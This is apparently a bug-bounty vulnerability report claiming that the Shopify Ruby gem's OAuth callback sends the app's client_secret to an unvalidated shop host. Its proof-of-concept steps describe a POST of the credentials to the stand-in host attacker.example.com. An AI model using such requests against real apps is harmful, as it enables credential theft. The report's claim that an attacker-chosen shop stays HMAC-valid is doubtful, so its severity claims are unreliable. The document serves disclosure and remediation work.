### Title
OAuth callback token exchange uses attacker-controlled `shop` from HMAC-signed query without validating it is a genuine `*.myshopify.com` domain, allowing SSRF that discloses the app's `client_secret` - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request using `auth_query.shop` as the destination host, but unlike every other OAuth-adjacent flow in the gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.exchange_token`), it never runs the value through `Utils::ShopValidator.sanitize!`. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`HmacValidator.validate` only proves that the query string (`code`, `host`, `shop`, `state`, `timestamp`) was signed by the app's own secret — it does not constrain `shop` to be a real Shopify store domain. [4](#0-3) [5](#0-4) 

`validate_auth_callback` takes `auth_query.shop` straight into `Auth::Session.new(shop: auth_query.shop)` and then `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, which sets `@base_uri = "https://#{api_host || session.shop}"`. [6](#0-5) [7](#0-6) 

The token-exchange request body includes `client_secret: Context.api_secret_key` and is POSTed to `https://#{auth_query.shop}/admin/oauth/access_token`. [8](#0-7) 

This is exactly the identity-binding gap the report's bug class describes: a host is validated by HMAC (the signature check proves the *value* of `shop` wasn't tampered with by a non-Shopify actor in transit — assuming the redirect originated from Shopify) but the *equality* `host validated == host that receives the client_secret` is never checked to be a real, trusted Shopify domain. The gem ships a dedicated `Utils::ShopValidator.sanitize!` precisely for this purpose — restricting the resolved host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) — and applies it in `ClientCredentials`, `RefreshToken`, and `TokenExchange`, but `Oauth.begin_auth`/`Oauth.validate_auth_callback` were left out. [9](#0-8) [10](#0-9) 

Because `begin_auth` similarly builds `auth_route = auth_base_uri(shop) + "/oauth/authorize?..."` from a caller-supplied `shop` (typically taken directly from a request header per the gem's own documented usage pattern, e.g. `shop = request.headers["Shop"]`) without sanitization, an application following the documented integration pattern can be driven to initiate — and, more importantly, *complete* — an OAuth dance against a host of the attacker's choosing. [11](#0-10) [12](#0-11) 

### Impact Explanation
If a host application passes an attacker-influenced `shop` value through to `validate_auth_callback` (e.g., because it trusts the HMAC-signed `auth_query.shop` as sufficient, which the gem's own sibling methods treat as insufficient and explicitly sanitize), the gem will POST the app's `client_id` and `client_secret` to an attacker-chosen host in the token-exchange request body. This is credential exfiltration of the app's `client_secret` via SSRF with the app's credentials — classified High under the rules (SSRF with the app's credentials / credential leakage). If the attacker's `shop` value also lets them control the response for the `access_token` exchange, this could escalate to obtaining a session bound to a store/token combination outside the intended tenant, which can implicate cross-tenant access — Critical.

### Likelihood Explanation
The gem's own documentation for step 3 of the OAuth flow shows `shop = request.headers["Shop"]` being passed to `begin_auth` without any prior validation, and nothing inside `begin_auth`/`validate_auth_callback` normalizes or restricts the domain the way `ShopValidator.sanitize!` does elsewhere in the same codebase. This is a documented, expected usage pattern of the library's own API (not a case of the host app ignoring documented behavior), and the missing validation is squarely inside `lib/shopify_api/auth/oauth.rb`, which is in scope. The HMAC check does not mitigate this because it signs the `shop` value but does not constrain it to a Shopify domain.

### Recommendation
In `lib/shopify_api/auth/oauth.rb`, sanitize `shop` with `Utils::ShopValidator.sanitize!` at the top of both `begin_auth` and `validate_auth_callback`, mirroring the pattern already used in `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.exchange_token`, and use the sanitized value (not the raw `auth_query.shop`) for `auth_base_uri`, `Auth::Session.new`, and `Session.from`.

### Proof of Concept
1. A host application (following the gem's documented pattern) calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: request.headers["Shop"], redirect_path: "/auth/callback")` with an attacker-supplied `Shop` header such as `attacker.example.com`.
2. `auth_base_uri("attacker.example.com")` returns `https://attacker.example.com/admin`, and the user is redirected there instead of a real Shopify domain — no `ShopValidator` check exists to reject it. [13](#0-12) 
3. If the resulting `auth_query` (still HMAC-valid because it is signed over the same attacker-chosen `shop` value using `URI.encode_www_form`) is passed to `validate_auth_callback`, the gem constructs `null_session = Auth::Session.new(shop: "attacker.example.com")` and issues `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` in cleartext — handing the app's `client_secret` to the attacker's server. [14](#0-13) 

Note: exploitability depends on how the host application sources and passes the `shop`/`auth_query.shop` value (e.g., trusting a client-controllable header, as shown in the gem's own docs example). I was not able to find any compensating validation inside `lib/shopify_api/**` (outside `rest/resources`) for this path; `Utils::ShopValidator` exists but is not invoked by `Oauth.begin_auth` or `Oauth.validate_auth_callback`.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
